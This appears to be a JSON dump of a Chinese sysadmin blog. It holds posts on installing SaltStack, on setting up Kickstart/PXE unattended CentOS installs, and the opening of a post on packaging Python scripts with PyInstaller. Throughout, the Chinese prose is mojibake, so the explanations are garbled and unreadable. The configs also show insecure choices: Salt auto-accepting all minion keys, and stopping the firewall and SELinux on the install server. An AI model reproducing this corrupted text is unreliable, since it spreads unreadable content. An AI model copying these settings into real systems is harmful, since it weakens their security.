salt.client.LocalClient.cmd_clié€šè¿‡è½®è¯¢è·å–Jobæ‰§è¡Œç»“æœï¼Œå°†ç»“æœè¾“å‡ºåˆ°ç»ˆç«¯ã€‚ ä¸‹é¢è®©æˆ‘ä»¬æ¥ä½¿ç”¨å®ƒï¼Œæ‰èƒ½æ›´å¥½çš„ç†è§£å®ƒçš„å·¥ä½œæ¨¡å¼å’ŒåŸç† å®‰è£… CentOS6/Redhat6 1sudo yum install https://repo.saltstack.com/yum/redhat/salt-repo-latest-1.el6.noarch.rpm 1yum clean all å®‰è£…salt-minion, salt-master, æˆ–è€…å…¶å®ƒç»„ä»¶ 123456sudo yum install salt-master #serverç«¯sudo yum install salt-minion #clientç«¯sudo yum install salt-sshsudo yum install salt-syndicsudo yum install salt-cloudsudo yum install salt-api æœåŠ¡ç«¯ 1sudo yum install salt-master å®¢æˆ·ç«¯ 1sudo yum install salt-minion é…ç½® :æœåŠ¡ç«¯ vim /etc/salt/master#masteræ¶ˆæ¯å‘å¸ƒç«¯å£ Default: 4505 publish_port: 4505 #å·¥ä½œçº¿ç¨‹æ•°ï¼Œåº”ç­”å’Œæ¥å—minion Default: 5 worker_threads: 100 #å®¢æˆ·ç«¯ä¸æœåŠ¡ç«¯é€šä¿¡çš„ç«¯å£ Default: 4506 ret_port: 4506 # è‡ªåŠ¨æ¥å—æ‰€æœ‰å®¢æˆ·ç«¯ auto_accept: True # è‡ªåŠ¨è®¤è¯é…ç½® autosign_file: /etc/salt/autosign.conf å®¢æˆ·ç«¯ vim /etc/salt/minion# master IPæˆ–åŸŸå master: 10.0.0.1 # å®¢æˆ·ç«¯ä¸æœåŠ¡ç«¯é€šä¿¡çš„ç«¯å£ã€‚ Default: 4506 syndic_master_port: 4506 # å»ºè®®çº¿ä¸Šç”¨ipæ˜¾ç¤ºæˆ–ä¸šåŠ¡ç¼–å· id: test id minionçš„å”¯ä¸€æ ‡ç¤ºã€‚Default: hostname minion idï¼šminionçš„å”¯ä¸€æ ‡ç¤ºï¼Œé»˜è®¤ä¸ºminionçš„hostnameï¼Œå¦‚æœidä¿®æ”¹äº†ï¼Œmaster éœ€è¦é‡æ–°è®¤è¯ã€‚ï¼ˆé€šè¿‡tcpdumpåšäº†ä¸ªå®éªŒï¼Œä¿®æ”¹minion idåï¼Œmasterä¸Šä¼šæ–°å¢ä¸€ä¸ªidï¼Œä½†è€idä¹Ÿè¿˜åœ¨ï¼Œæ‰§è¡Œsalt â€˜â€˜ test.pingçš„æ—¶å€™ï¼Œæ‰§è¡Œæ—¶é—´å˜é•¿äº†ï¼Œå»¶è¿Ÿæ—¶é—´çº¦ä¸º14sï¼Œè€Œä¸”masterä¼šåœ¨å‘é€å‘½ä»¤åå»¶è¿Ÿ10så†ç»™æ¯ä¸ªå·²ç»æ‰§è¡ŒæˆåŠŸçš„minionå‘é€ä¸€ä¸ªåŒ…å¹¶æœ‰minionæœ‰è¿”å›ï¼Œå¦‚æœæ²¡æœ‰è€idå­˜åœ¨ä¸ä¼šå‘é€ï¼Œå¯ä»¥ç†è§£ä¸ºmateråœ¨å‘æ¯ä¸ªminionå¯»æ±‚æœªè¿æ¥çš„idçš„ä¿¡æ¯ï¼Œminionçš„saltæœåŠ¡å…³é—­ä¹Ÿæ˜¯è¿™ç§æƒ…å†µï¼Œä¿®æ”¹timeoutå€¼æ— æ•ˆã€‚ï¼‰ æµ‹è¯•å‘½ä»¤ ï¼šæµ‹è¯•ç¯å¢ƒä¸­å…³é—­ iptblesï¼ï¼ 1service iptables stop masterç«¯æ‰§è¡Œ 12salt-key -L salt-key -A æŸ¥çœ‹åˆ°minionç«¯ipè¡¨ç¤ºæˆåŠŸ Accepted Keys:192.168.1.3Denied Keys:Unaccepted Keys:Rejected Keys: 1salt '*' test.ping 192.168.1.3: True Posted by : DY","raw":null,"content":null,"categories":[{"name":"è‡ªåŠ¨åŒ–è¿ç»´","slug":"è‡ªåŠ¨åŒ–è¿ç»´","permalink":"https://kionf.com/categories/è‡ªåŠ¨åŒ–è¿ç»´/"},{"name":"Tools","slug":"è‡ªåŠ¨åŒ–è¿ç»´/Tools","permalink":"https://kionf.com/categories/è‡ªåŠ¨åŒ–è¿ç»´/Tools/"}],"tags":[{"name":"Saltstack","slug":"Saltstack","permalink":"https://kionf.com/tags/Saltstack/"}]},{"title":"Kickstartæ— äººå€¼å®ˆå®‰è£…Linux","slug":"linux-kickstart","date":"2016-05-11T16:00:00.000Z","updated":"2018-10-31T10:19:28.299Z","comments":true,"path":"2016/05/12/linux-kickstart/","link":"","permalink":"https://kionf.com/2016/05/12/linux-kickstart/","excerpt":"ä½œä¸ºä¸­å°å…¬å¸çš„è¿ç»´ï¼Œç»å¸¸ä¼šé‡åˆ°ä¸€äº›æœºæ¢°å¼çš„é‡å¤å·¥ä½œï¼Œä¾‹å¦‚ï¼šæœ‰æ—¶å…¬å¸åŒæ—¶ä¸Šçº¿å‡ åç”šè‡³ä¸Šç™¾å°æœåŠ¡å™¨ï¼Œè€Œä¸”éœ€è¦æˆ‘ä»¬åœ¨çŸ­æ—¶é—´å†…å®Œæˆç³»ç»Ÿå®‰è£…ã€‚\nOKè®©æˆ‘ä»¬æ¥ä¸€èµ·kickstartå§\n","text":"ä½œä¸ºä¸­å°å…¬å¸çš„è¿ç»´ï¼Œç»å¸¸ä¼šé‡åˆ°ä¸€äº›æœºæ¢°å¼çš„é‡å¤å·¥ä½œï¼Œä¾‹å¦‚ï¼šæœ‰æ—¶å…¬å¸åŒæ—¶ä¸Šçº¿å‡ åç”šè‡³ä¸Šç™¾å°æœåŠ¡å™¨ï¼Œè€Œä¸”éœ€è¦æˆ‘ä»¬åœ¨çŸ­æ—¶é—´å†…å®Œæˆç³»ç»Ÿå®‰è£…ã€‚ OKè®©æˆ‘ä»¬æ¥ä¸€èµ·kickstartå§ 1. ç®€ä»‹ç†è®ºæ€§çŸ¥è¯†å»ºè®®å¤§æ¦‚çœ‹ä¸‹,å…ˆæŒ‰ç…§æ­¥éª¤åšä¸€éçŸ¥åˆ°å¤§æ¦‚æ€è·¯,åœ¨ä»”ç»†çœ‹ä¼šæ›´å¥½(ä¸ªäººå»ºè®®) 1) ä»€ä¹ˆæ˜¯PXE? PXEï¼Œå…¨åPre-boot Execution Environmentï¼Œé¢„å¯åŠ¨æ‰§è¡Œç¯å¢ƒï¼›é€šè¿‡ç½‘ç»œæ¥å£å¯åŠ¨è®¡ç®—æœºï¼Œä¸ä¾èµ–æœ¬åœ°å­˜å‚¨è®¾å¤‡ï¼ˆå¦‚ç¡¬ç›˜ï¼‰æˆ–æœ¬åœ°å·²å®‰è£…çš„æ“ä½œç³»ç»Ÿï¼›ç”±Intelå’ŒSystemsoftå…¬å¸äº1999å¹´9æœˆ20æ—¥å…¬å¸ƒçš„æŠ€æœ¯ï¼›Client/Serverçš„å·¥ä½œæ¨¡å¼:PXEå®¢æˆ·ç«¯ä¼šè°ƒç”¨ç½‘é™…åè®®(IP)ã€ç”¨æˆ·æ•°æ®æŠ¥åè®®(UDP)ã€åŠ¨æ€ä¸»æœºè®¾å®šåè®®(DHCP)ã€å°å‹æ–‡ä»¶ä¼ è¾“åè®®(TFTP)ç­‰ç½‘ç»œåè®®ï¼›PXEå®¢æˆ·ç«¯(client)è¿™ä¸ªæœ¯è¯­æ˜¯æŒ‡æœºå™¨åœ¨PXEå¯åŠ¨è¿‡ç¨‹ä¸­çš„è§’è‰²ã€‚ä¸€ä¸ªPXEå®¢æˆ·ç«¯å¯ä»¥æ˜¯ä¸€å°æœåŠ¡å™¨ã€ç¬”è®°æœ¬ç”µè„‘æˆ–è€…å…¶ä»–è£…æœ‰PXEå¯åŠ¨ä»£ç çš„æœºå™¨ï¼ˆæˆ‘ä»¬ç”µè„‘çš„ç½‘å¡ï¼‰ã€‚ 2) PXEå·¥ä½œè¿‡ç¨‹ 1. PXE Clientå‘DHCPå‘é€è¯·æ±‚PXE Clientä»è‡ªå·±çš„PXEç½‘å¡å¯åŠ¨ï¼Œé€šè¿‡PXE BootROM(è‡ªå¯åŠ¨èŠ¯ç‰‡)ä¼šä»¥UDP(ç®€å•ç”¨æˆ·æ•°æ®æŠ¥åè®®)å‘é€ä¸€ä¸ªå¹¿æ’­è¯·æ±‚ï¼Œå‘æœ¬ç½‘ç»œä¸­çš„DHCPæœåŠ¡å™¨ç´¢å–IPã€‚ 2. DHCPæœåŠ¡å™¨æä¾›ä¿¡æ¯DHCPæœåŠ¡å™¨æ”¶åˆ°å®¢æˆ·ç«¯çš„è¯·æ±‚ï¼ŒéªŒè¯æ˜¯å¦æ¥è‡³åˆæ³•çš„PXE Clientçš„è¯·æ±‚ï¼ŒéªŒè¯é€šè¿‡å®ƒå°†ç»™å®¢æˆ·ç«¯ä¸€ä¸ªâ€œæä¾›â€å“åº”ï¼Œè¿™ä¸ªâ€œæä¾›â€å“åº”ä¸­åŒ…å«äº†ä¸ºå®¢æˆ·ç«¯åˆ†é…çš„IPåœ°å€ã€pxelinuxå¯åŠ¨ç¨‹åº(TFTP)ä½ç½®ï¼Œä»¥åŠé…ç½®æ–‡ä»¶æ‰€åœ¨ä½ç½®ã€‚ 3. PXEå®¢æˆ·ç«¯è¯·æ±‚ä¸‹è½½å¯åŠ¨æ–‡ä»¶å®¢æˆ·ç«¯æ”¶åˆ°æœåŠ¡å™¨çš„â€œå›åº”â€åï¼Œä¼šå›åº”ä¸€ä¸ªå¸§ï¼Œä»¥è¯·æ±‚ä¼ é€å¯åŠ¨æ‰€éœ€æ–‡ä»¶ã€‚è¿™äº›å¯åŠ¨æ–‡ä»¶åŒ…æ‹¬ï¼špxelinux.0ã€pxelinux.cfg/defaultã€vmlinuzã€initrd.imgç­‰æ–‡ä»¶ã€‚ 4. Boot Serverå“åº”å®¢æˆ·ç«¯è¯·æ±‚å¹¶ä¼ é€æ–‡ä»¶å½“æœåŠ¡å™¨æ”¶åˆ°å®¢æˆ·ç«¯çš„è¯·æ±‚åï¼Œä»–ä»¬ä¹‹é—´ä¹‹åå°†æœ‰æ›´å¤šçš„ä¿¡æ¯åœ¨å®¢æˆ·ç«¯ä¸æœåŠ¡å™¨ä¹‹é—´ä½œåº”ç­”, ç”¨ä»¥å†³å®šå¯åŠ¨å‚æ•°ã€‚BootROMç”±TFTPé€šè®¯åè®®ä»Boot Serverä¸‹è½½å¯åŠ¨å®‰è£…ç¨‹åºæ‰€å¿…é¡»çš„æ–‡ä»¶(pxelinux.0ã€pxelinux.cfg/default)ã€‚defaultæ–‡ä»¶ä¸‹è½½å®Œæˆåï¼Œä¼šæ ¹æ®è¯¥æ–‡ä»¶ä¸­å®šä¹‰çš„å¼•å¯¼é¡ºåºï¼Œå¯åŠ¨Linuxå®‰è£…ç¨‹åºçš„å¼•å¯¼å†…æ ¸ã€‚ 5. è¯·æ±‚ä¸‹è½½è‡ªåŠ¨åº”ç­”æ–‡ä»¶å®¢æˆ·ç«¯é€šè¿‡pxelinux.cfg/defaultæ–‡ä»¶æˆåŠŸçš„å¼•å¯¼Linuxå®‰è£…å†…æ ¸åï¼Œå®‰è£…ç¨‹åºé¦–å…ˆå¿…é¡»ç¡®å®šä½ é€šè¿‡ä»€ä¹ˆå®‰è£…ä»‹è´¨æ¥å®‰è£…linuxï¼Œå¦‚æœæ˜¯é€šè¿‡ç½‘ç»œå®‰è£…(NFS, FTP, HTTP)ï¼Œåˆ™ä¼šåœ¨è¿™ä¸ªæ—¶å€™åˆå§‹åŒ–ç½‘ç»œï¼Œå¹¶å®šä½å®‰è£…æºä½ç½®ã€‚æ¥ç€ä¼šè¯»å–defaultæ–‡ä»¶ä¸­æŒ‡å®šçš„è‡ªåŠ¨åº”ç­”æ–‡ä»¶ks.cfgæ‰€åœ¨ä½ç½®ï¼Œæ ¹æ®è¯¥ä½ç½®è¯·æ±‚ä¸‹è½½è¯¥æ–‡ä»¶ã€‚ è¿™é‡Œæœ‰ä¸ªé—®é¢˜ï¼Œåœ¨ç¬¬2æ­¥å’Œç¬¬5æ­¥åˆå§‹åŒ–2æ¬¡ç½‘ç»œäº†ï¼Œè¿™æ˜¯ç”±äºPXEè·å–çš„æ˜¯å®‰è£…ç”¨çš„å†…æ ¸ä»¥åŠå®‰è£…ç¨‹åºç­‰ï¼Œè€Œå®‰è£…ç¨‹åºè¦è·å–çš„æ˜¯å®‰è£…ç³»ç»Ÿæ‰€éœ€çš„äºŒè¿›åˆ¶åŒ…ä»¥åŠé…ç½®æ–‡ä»¶ã€‚å› æ­¤PXEæ¨¡å—å’Œå®‰è£…ç¨‹åºæ˜¯ç›¸å¯¹ç‹¬ç«‹çš„ï¼ŒPXEçš„ç½‘ç»œé…ç½®å¹¶ä¸èƒ½ä¼ é€’ç»™å®‰è£…ç¨‹åºï¼Œä»è€Œè¿›è¡Œä¸¤æ¬¡è·å–IPåœ°å€è¿‡ç¨‹ï¼Œä½†IPåœ°å€åœ¨DHCPçš„ç§ŸæœŸå†…æ˜¯ä¸€æ ·çš„ã€‚ 6. å®¢æˆ·ç«¯å®‰è£…æ“ä½œç³»ç»Ÿå°†ks.cfgæ–‡ä»¶ä¸‹è½½å›æ¥åï¼Œé€šè¿‡è¯¥æ–‡ä»¶æ‰¾åˆ°OS Serverï¼Œå¹¶æŒ‰ç…§è¯¥æ–‡ä»¶çš„é…ç½®è¯·æ±‚ä¸‹è½½å®‰è£…è¿‡ç¨‹éœ€è¦çš„è½¯ä»¶åŒ…ã€‚OS Serverå’Œå®¢æˆ·ç«¯å»ºç«‹è¿æ¥åï¼Œå°†å¼€å§‹ä¼ è¾“è½¯ä»¶åŒ…ï¼Œå®¢æˆ·ç«¯å°†å¼€å§‹å®‰è£…æ“ä½œç³»ç»Ÿã€‚å®‰è£…å®Œæˆåï¼Œå°†æç¤ºé‡æ–°å¼•å¯¼è®¡ç®—æœºã€‚ 2. å®‰è£…DHCPæœåŠ¡å¦‚æœæ˜¯ç”¨è™šæ‹Ÿæœºæµ‹è¯•éœ€è¦å…³é—­è™šæ‹Ÿç½‘å¡DHCPåŠŸèƒ½ 1) å®‰è£…åŒ…123456[root@CentOS6.5 ~]# yum -y install dhcp[root@CentOS6.5 ~]# rpm -ql dhcp |grep \"dhcpd.conf\"/etc/dhcp/dhcpd.conf # æŸ¥çœ‹é…ç½®æ–‡ä»¶ä½ç½®/usr/share/doc/dhcp-4.1.1/dhcpd-conf-to-ldap/usr/share/doc/dhcp-4.1.1/dhcpd.conf.sample/usr/share/man/man5/dhcpd.conf.5.gz 2) ç¼–è¾‘é…ç½®æ–‡ä»¶[root@CentOS6.5 ~]# vim /etc/dhcp/dhcp.conf 123456789default-lease-time 14400;ddns-update-style none;next-server 192.168.1.52; #æŒ‡å®štftpdæœåŠ¡å™¨ipfilename \"pxelinux.0\";subnet 192.168.1.0 netmask 255.255.255.0 &#123; #åœ°å€æ±  range 192.168.1.50 192.168.1.240; default-lease-time 14400; # è®¾ç½®é»˜è®¤çš„IPç§Ÿç”¨æœŸé™ max-lease-time 172800;&#125; [root@CentOS6.5 ~]# vim /etc/sysconfig/dhcpd 1DHCPDARGS=eth1 # æŒ‡å®šç›‘å¬ç½‘å¡ [root@CentOS6.5 ~]# service dhcpd restart 3. å®‰è£…TFTP1) TFTPç®€ä»‹:TFTPï¼ˆTrivial File Transfer Protocol,ç®€å•æ–‡ä»¶ä¼ è¾“åè®®ï¼‰æ˜¯TCP/IPåè®®æ—ä¸­çš„ä¸€ä¸ªç”¨æ¥åœ¨å®¢æˆ·æœºä¸æœåŠ¡å™¨ä¹‹é—´è¿›è¡Œç®€å•æ–‡ä»¶ä¼ è¾“çš„åè®®ï¼Œæä¾›ä¸å¤æ‚ã€å¼€é”€ä¸å¤§çš„æ–‡ä»¶ä¼ è¾“æœåŠ¡ã€‚ç«¯å£å·ä¸º69ã€‚ 2) TFTPå®‰è£…é…ç½®1234567891011121314151617181920[root@CentOS6.5 ~]# yum -y install tftp-server[root@CentOS6.5 ~]# vim /etc/xinetd.d/tftpservice tftp&#123; socket_type = dgram protocol = udp wait = yes user = root server = /usr/sbin/in.tftpd server_args = -s /var/lib/tftpboot # æŒ‡å®šç›®å½•ï¼Œä¿æŒé»˜è®¤ï¼Œä¸ç”¨ä¿®æ”¹ disable = no # ç”±åŸæ¥çš„yesæ”¹ä¸ºno per_source = 11 cps = 100 2 flags = IPv4&#125;[root@CentOS6.5 ~]# /etc/init.d/xinetd restartStopping xinetd: [FAILED]Starting xinetd: [ OK ][root@CentOS6.5 ~]# netstat -tunlp|grep 69udp 0 0 0.0.0.0:69 0.0.0.0:* 1106/xinetd 4. å®‰è£…HTTPæœåŠ¡å¯ä»¥ç”¨Apacheæˆ–Nginxæä¾›HTTPæœåŠ¡ã€‚Pythonçš„å‘½ä»¤webæœåŠ¡ä¸è¡Œï¼Œä¼šæœ‰æŠ¥é”™ã€‚ 12345678910111213[root@CentOS6.5 ~]# yum -y install httpd[root@CentOS6.5 ~]# sed -i \"277i ServerName 127.0.0.1:80\" /etc/httpd/conf/httpd.conf[root@CentOS6.5 ~]# /etc/init.d/httpd start[root@CentOS6.5 ~]# mkdir /var/www/html/CentOS-6.5[root@CentOS6.5 ~]# mount /dev/sr0 /var/www/html/CentOS-6.5/ #sr0æµ‹è¯•è™šæ‹Ÿæœºç¯å¢ƒçº¿ä¸Šä¼šä¸åŒmount: block device /dev/sr0 is write-protected, mounting read-only[root@CentOS6.5 ~]# df -hFilesystem Size Used Avail Use% Mounted on/dev/sda3 19G 2.4G 16G 14% /tmpfs 491M 16K 491M 1% /dev/shm/dev/sda1 190M 36M 145M 20% /boot/dev/sr0 3.7G 3.7G 0 100% /var/www/html/CentOS-6.5# ä¸ç®¡æ€ä¹ˆå¼„ï¼Œåªè¦æŠŠå®‰è£…å…‰ç›˜å†…å®¹èƒ½é€šè¿‡webå‘å¸ƒå³å¯ã€‚å› ä¸ºæ˜¯æ¼”ç¤ºï¼Œå¦‚æœå¤åˆ¶é•œåƒå°±æœ‰ç‚¹æµªè´¹æ—¶é—´ã€‚ä½†ç”Ÿäº§ç¯å¢ƒå°±ä¸€å®šè¦å¤åˆ¶äº†ï¼Œå…‰ç›˜è¯»å–é€Ÿåº¦æœ‰é™ã€‚ æµè§ˆå™¨è®¿é—®æµ‹è¯•é…ç½®æ˜¯å¦æˆåŠŸhttp://IP/CentOS-6.5 5. é…ç½®æ”¯æŒPXEçš„å¯åŠ¨ç¨‹åºsyslinuxæ˜¯ä¸€ä¸ªåŠŸèƒ½å¼ºå¤§çš„å¼•å¯¼åŠ è½½ç¨‹åºï¼Œè€Œä¸”å…¼å®¹å„ç§ä»‹è´¨ã€‚SYSLINUXæ˜¯ä¸€ä¸ªå°å‹çš„Linuxæ“ä½œç³»ç»Ÿï¼Œå®ƒçš„ç›®çš„æ˜¯ç®€åŒ–é¦–æ¬¡å®‰è£…Linuxçš„æ—¶é—´ï¼Œå¹¶å»ºç«‹ä¿®æŠ¤æˆ–å…¶å®ƒç‰¹æ®Šç”¨é€”çš„å¯åŠ¨ç›˜ã€‚å¦‚æœæ²¡æœ‰æ‰¾åˆ°pxelinux.0è¿™ä¸ªæ–‡ä»¶,å¯ä»¥å®‰è£…ä¸€ä¸‹ã€‚ 12345678910[root@CentOS6.5 ~]# yum -y install syslinux[root@CentOS6.5 ~]# cp /usr/share/syslinux/pxelinux.0 /var/lib/tftpboot/# å¤åˆ¶å¯åŠ¨èœå•ç¨‹åºæ–‡ä»¶[root@CentOS6.5 ~]# cp -a /var/www/html/CentOS-6.5/isolinux/* /var/lib/tftpboot/[root@CentOS6.5 ~]# ls /var/lib/tftpboot/boot.cat grub.conf isolinux.bin memtest splash.jpg vesamenu.c32boot.msg initrd.img isolinux.cfg pxelinux.0 TRANS.TBL vmlinuz# æ–°å»ºä¸€ä¸ªpxelinux.cfgç›®å½•ï¼Œå­˜æ”¾å®¢æˆ·ç«¯çš„é…ç½®æ–‡ä»¶ã€‚[root@CentOS6.5 ~]# mkdir -p /var/lib/tftpboot/pxelinux.cfg[root@CentOS6.5 ~]# cp /var/www/html/CentOS-6.5/isolinux/isolinux.cfg /var/lib/tftpboot/pxelinux.cfg/default 6. æµ‹è¯•æ‰‹åŠ¨ç½‘ç»œå®‰è£…å¼€å¯ä¸€ä¸ªæ–°çš„è™šæ‹Ÿæœºå†…å­˜ç»™1GB,ä¸å‡ºé”™è¯¯ä¼šçœ‹åˆ°å…‰ç›˜å®‰è£…ç•Œé¢, æ¥ä¸‹æ¥å°±æ˜¯åˆ›å»ºks.cfgäº†. å…³é—­æµ‹è¯•è™šæ‹Ÿæœº,ç»§ç»­ 7. åˆ›å»ºks.cfgæ–‡ä»¶ é€šå¸¸ï¼Œæˆ‘ä»¬åœ¨å®‰è£…æ“ä½œç³»ç»Ÿçš„è¿‡ç¨‹ä¸­ï¼Œéœ€è¦å¤§é‡çš„å’ŒæœåŠ¡å™¨äº¤äº’æ“ä½œï¼Œä¸ºäº†å‡å°‘è¿™ä¸ªäº¤äº’è¿‡ç¨‹ï¼Œkickstartå°±è¯ç”Ÿäº†ã€‚ä½¿ç”¨è¿™ç§kickstartï¼Œåªéœ€äº‹å…ˆå®šä¹‰å¥½ä¸€ä¸ªKickstartè‡ªåŠ¨åº”ç­”é…ç½®æ–‡ä»¶ks.cfgï¼ˆé€šå¸¸å­˜æ”¾åœ¨å®‰è£…æœåŠ¡å™¨ä¸Šï¼‰ï¼Œå¹¶è®©å®‰è£…ç¨‹åºçŸ¥é“è¯¥é…ç½®æ–‡ä»¶çš„ä½ç½®ï¼Œåœ¨å®‰è£…è¿‡ç¨‹ä¸­å®‰è£…ç¨‹åºå°±å¯ä»¥è‡ªå·±ä»è¯¥æ–‡ä»¶ä¸­è¯»å–å®‰è£…é…ç½®ï¼Œè¿™æ ·å°±é¿å…äº†åœ¨å®‰è£…è¿‡ç¨‹ä¸­å¤šæ¬¡çš„äººæœºäº¤äº’ï¼Œä»è€Œå®ç°æ— äººå€¼å®ˆçš„è‡ªåŠ¨åŒ–å®‰è£…ã€‚ ç”Ÿæˆkickstarté…ç½®æ–‡ä»¶çš„ä¸‰ç§æ–¹æ³•ï¼š æ–¹æ³•1ã€ æ¯å®‰è£…å¥½ä¸€å°Centosæœºå™¨ï¼ŒCentoså®‰è£…ç¨‹åºéƒ½ä¼šåˆ›å»ºä¸€ä¸ªkickstarté…ç½®æ–‡ä»¶ï¼Œè®°å½•ä½ çš„çœŸå®å®‰è£…é…ç½®ã€‚å¦‚æœä½ å¸Œæœ›å®ç°å’ŒæŸç³»ç»Ÿç±»ä¼¼çš„å®‰è£…ï¼Œå¯ä»¥åŸºäºè¯¥ç³»ç»Ÿçš„kickstarté…ç½®æ–‡ä»¶æ¥ç”Ÿæˆä½ è‡ªå·±çš„kickstarté…ç½®æ–‡ä»¶ã€‚ï¼ˆç”Ÿæˆçš„æ–‡ä»¶åå­—å«anaconda-ks.cfgä½äº/root/anaconda-ks.cfgï¼‰ æ–¹æ³•2ã€Centosæä¾›äº†ä¸€ä¸ªå›¾å½¢åŒ–çš„kickstarté…ç½®å·¥å…·ã€‚åœ¨ä»»ä½•ä¸€ä¸ªå®‰è£…å¥½çš„Linuxç³»ç»Ÿä¸Šè¿è¡Œè¯¥å·¥å…·ï¼Œå°±å¯ä»¥å¾ˆå®¹æ˜“åœ°åˆ›å»ºä½ è‡ªå·±çš„kickstarté…ç½®æ–‡ä»¶ã€‚kickstarté…ç½®å·¥å…·å‘½ä»¤ä¸ºrsystem-config-kickstart,ç½‘ä¸Šæœ‰å¾ˆå¤šç”¨CentOSæ¡Œé¢ç‰ˆç”Ÿæˆksæ–‡ä»¶çš„æ–‡ç« ï¼Œå¦‚æœæœ‰ç°æˆçš„ç³»ç»Ÿå°±æ²¡ä»€ä¹ˆå¯è¯´ã€‚ä½†æ²¡æœ‰ç°æˆçš„ï¼Œä¹Ÿæ²¡æœ‰å¿…è¦å»ç”¨æ¡Œé¢ç‰ˆï¼Œå‘½ä»¤è¡Œä¹Ÿå¾ˆç®€å•ã€‚ æ–¹æ³•3ã€é˜…è¯»kickstarté…ç½®æ–‡ä»¶çš„æ‰‹å†Œã€‚ç”¨ä»»ä½•ä¸€ä¸ªæ–‡æœ¬ç¼–è¾‘å™¨éƒ½å¯ä»¥åˆ›å»ºä½ è‡ªå·±çš„kickstarté…ç½®æ–‡ä»¶ã€‚ è¿™é‡Œè´´å‡ºæˆ‘çš„ks.cfg,è¿™ä¸ªæ˜¯CentOS6.8çš„,å¯ä»¥æ ¹æ®éœ€æ±‚æ›´æ”¹ è¿™é‡Œæ˜¯å®˜æ–¹æ–‡æ¡£è¯¦è§£ks.cfgé…ç½®æ–‡ä»¶è¯­å¥CentOS 123456789101112131415161718192021222324252627282930313233343536#platform=x86, AMD64, æˆ– Intel EM64T#version=DEVEL# Firewall configurationfirewall --enabled --http --ssh# Install OS instead of upgradeinstall# Use network installationurl --url=\"http://192.168.1.52/CentOS6.5\"# Root passwordrootpw --iscrypted $1$xn3sYOAA$jOfmmjxxYA/IRjFm0BM5O0# System authorization informationauth --useshadow --passalgo=sha512# Use graphical installgraphical# System keyboardkeyboard us# System languagelang zh_CN# SELinux configurationselinux --enforcing# Do not configure the X Window Systemskipx# Installation logging levellogging --level=info# System timezonetimezone Africa/Libreville# System bootloader configurationbootloader --location=mbr# Partition clearing informationclearpart --all %packages@php%end 8. æ•´åˆDefaulté…ç½®æ–‡ä»¶å®ç°æ— äººå€¼å®ˆvim /var/lib/tftpboot/pxelinux.cfg/default 1234567default ksprompt 0label ks kernel vmlinuz append initrd=initrd.img ks=http://192.168.1.52/ks_config/CentOS-6.5-ks.cfg # å‘Šè¯‰å®‰è£…ç¨‹åºks.cfgæ–‡ä»¶åœ¨å“ªé‡Œ# append initrd=initrd.img ks=http://192.168.1.52/ks_config/CentOS-6.5-ks.cfg ksdevice=eth0# ksdevice=eth0ä»£è¡¨å½“å®¢æˆ·ç«¯æœ‰å¤šå—ç½‘å¡çš„æ—¶å€™ï¼Œè¦å®ç°è‡ªåŠ¨åŒ–éœ€è¦è®¾ç½®ä»eth1å®‰è£…ï¼Œä¸æŒ‡å®šçš„è¯ï¼Œå®‰è£…çš„æ—¶å€™ç³»ç»Ÿä¼šè®©ä½ é€‰æ‹©ï¼Œé‚£å°±ä¸å«å…¨è‡ªåŠ¨åŒ–äº† 9. æ‰“å¼€ç³»ç»Ÿç”µæº,å‡ºå»åƒä¸ªé¥­,è¿‡ä¼šå›æ¥,ç³»ç»Ÿå°±ä»¥ç»è£…å¥½äº†å…³é—­æœåŠ¡ç«¯çš„iptables,selinux 12service iptables stopsetenforce 0 å…¶cobblerä¹Ÿå¯å®ç°æ— äººå€¼å®ˆ,å±äºå·¥å…·","raw":null,"content":null,"categories":[{"name":"è‡ªåŠ¨åŒ–è¿ç»´","slug":"è‡ªåŠ¨åŒ–è¿ç»´","permalink":"https://kionf.com/categories/è‡ªåŠ¨åŒ–è¿ç»´/"},{"name":"Tools","slug":"è‡ªåŠ¨åŒ–è¿ç»´/Tools","permalink":"https://kionf.com/categories/è‡ªåŠ¨åŒ–è¿ç»´/Tools/"}],"tags":[]},{"title":"Pythoné»‘å®¢ä¹‹æ—…0x5","slug":"pythonhacker_0x5","date":"2015-10-16T16:00:00.000Z","updated":"2018-10-31T10:19:28.319Z","comments":true,"path":"2015/10/17/pythonhacker_0x5/","link":"","permalink":"https://kionf.com/2015/10/17/pythonhacker_0x5/","excerpt":"ä½¿ç”¨PyInstallerç”Ÿæˆå¯ä»¥æ‰§è¡Œç¨‹åºè¿™ä¸€ç« æ˜¯æ•™å¤§å®¶å¦‚ä½•æŠŠè‡ªå·±çš„pythonè„šæœ¬ç¼–è¯‘æˆwindowsä¸‹å¯æ‰§è¡Œæ–‡ä»¶ï¼Œå®ƒå¯ä»¥è®©ä½ çš„pythonè„šæœ¬è·¨å¹³å°å»è¿è¡Œï¼Œå¹¶ä¸”ä¸éœ€è¦å»å®‰è£…pythonè§£é‡Šå™¨ã€‚é¦–å…ˆæˆ‘ä»¬éœ€è¦ä¸‹è½½ä¾èµ–åŒ…,cygwin(æˆ–è€…å…¶ä»–çš„å·¥å…·ä¹Ÿå¯ä»¥ï¼Œè¿™é‡Œæˆ‘ä»¬ä½¿ç”¨Pywin).","text":"ä½¿ç”¨PyInstallerç”Ÿæˆå¯ä»¥æ‰§è¡Œç¨‹åºè¿™ä¸€ç« æ˜¯æ•™å¤§å®¶å¦‚ä½•æŠŠè‡ªå·±çš„pythonè„šæœ¬ç¼–è¯‘æˆwindowsä¸‹å¯æ‰§è¡Œæ–‡ä»¶ï¼Œå®ƒå¯ä»¥è®©ä½ çš„pythonè„šæœ¬è·¨å¹³å°å»è¿è¡Œï¼Œå¹¶ä¸”ä¸éœ€è¦å»å®‰è£…pythonè§£é‡Šå™¨ã€‚é¦–å…ˆæˆ‘ä»¬éœ€è¦ä¸‹è½½ä¾èµ–åŒ…,cygwin(æˆ–è€…å…¶ä»–çš„å·¥å…·ä¹Ÿå¯ä»¥ï¼Œè¿™é‡Œæˆ‘ä»¬ä½¿ç”¨Pywin). Pythonè½¬exeå®‰è£…Linux: sudo apt-get install python2.7 build-essential python-dev zlib1g-dev upx Windows: http://www.activestate.com/activepython (fully packaged installer file) å®‰è£… Pywin32, Setuptools, PyInstaller å®‰è£…å®Œæˆä¹‹åä¸‹ä¸€æ­¥æˆ‘ä»¬å°±è¿è¡Œpythonå‘½ä»¤ç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶: 1python pyinstaller.py --onefile &lt;scriptName&gt; 